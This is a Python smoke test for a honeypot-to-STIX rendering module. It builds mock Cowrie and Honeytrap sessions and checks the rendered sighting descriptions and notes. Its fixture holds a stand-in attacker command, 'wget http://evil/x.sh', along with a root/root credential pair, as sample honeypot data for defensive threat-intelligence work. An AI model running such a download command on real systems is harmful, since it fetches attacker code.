"""Smoke test for tpot2cti.stix.rendering (migrated from its old
`if __name__` block so CI runs it)."""
from __future__ import annotations

import tpot2cti.stix.rendering as _m
globals().update({k: v for k, v in vars(_m).items() if not k.startswith('__')})


def test_rendering_smoke():
    from datetime import datetime, timezone

    now = datetime.now(timezone.utc)

    # Build a substantive Cowrie session
    ev = ParsedEvent(
        src_ip="1.2.3.4",
        timestamp=now,
        sensor_hostname="node1",
        event_type="Cowrie",
        session_id="deadbeef0001",
        dst_port=22,
    )
    s = AttackSession.from_event(ev)
    s.auth_success = True
    s.commands = ["ls /tmp", "wget http://evil/x.sh"]
    s.malware_hashes = ["a" * 64]
    s.urls = ["http://evil/x.sh"]
    s.domains = ["evil"]
    s.credentials_tried = [("root", "root")]
    s.hassh = "fakehassh"
    s.ssh_version = "SSH-2.0-OpenSSH_7.4"

    desc = render_cowrie_sighting_description(s)
    assert "Cowrie SSH" in desc and "auth: success" in desc, desc
    print(f"render_cowrie_sighting_description: {desc!r}")

    body = render_cowrie_session_note_body(s)
    assert "# Cowrie SSH session" in body
    assert "wget http://evil/x.sh" in body
    assert "a" * 64 in body
    print(f"render_cowrie_session_note_body: {len(body)} bytes; first line: "
          f"{body.splitlines()[0]!r}")

    # Honeytrap event
    ht_ev = ParsedEvent(
        src_ip="5.6.7.8", timestamp=now, sensor_hostname="node1",
        event_type="Honeytrap", dst_port=4444, protocol="tcp",
    )
    ht_ev.meta["payload_printable"] = "GET / HTTP/1.0\r\nHost: x\r\n"
    ht_ev.meta["payload_hex"] = "474554"
    ht_s = AttackSession.from_event(ht_ev)
    ht_desc = render_honeytrap_sighting_description(ht_s, ht_ev)
    # Full-squeeze format: burst-level scan summary, port surfaced + service,
    # HTTP fingerprint on the payload.
    assert "Honeytrap" in ht_desc, ht_desc
    assert "tcp/4444" in ht_desc, ht_desc
    assert "payload" in ht_desc, ht_desc
    assert "HTTP" in ht_desc, ht_desc
    print(f"render_honeytrap_sighting_description: {ht_desc!r}")

    # Fallback event with src_ip
    fb_ev = ParsedEvent(
        src_ip="9.9.9.9", timestamp=now, sensor_hostname="node2",
        event_type="WeirdProto", dst_port=12345, protocol="tcp",
    )
    fb_desc = render_fallback_sighting_description(fb_ev, "WeirdProto")
    assert "WeirdProto" in fb_desc and "tcp/12345" in fb_desc, fb_desc
    print(f"render_fallback_sighting_description: {fb_desc!r}")

    # Fallback no-IP Note body
    fb_ev_no_ip = ParsedEvent(
        src_ip="", timestamp=now, sensor_hostname="node3",
        event_type="WeirdProto", dst_port=None,
    )
    fb_ev_no_ip.raw_doc = {"type": "WeirdProto", "blob": {"foo": "bar"}}
    note_body = render_fallback_no_ip_note_body(fb_ev_no_ip, "WeirdProto")
    assert "Source IP: missing" in note_body
    assert "Destination port: missing" in note_body
    assert "WeirdProto" in note_body
    print(f"render_fallback_no_ip_note_body: {len(note_body)} bytes; "
          f"first line: {note_body.splitlines()[0]!r}")

    print("\nAll render-helper smoke checks passed.")
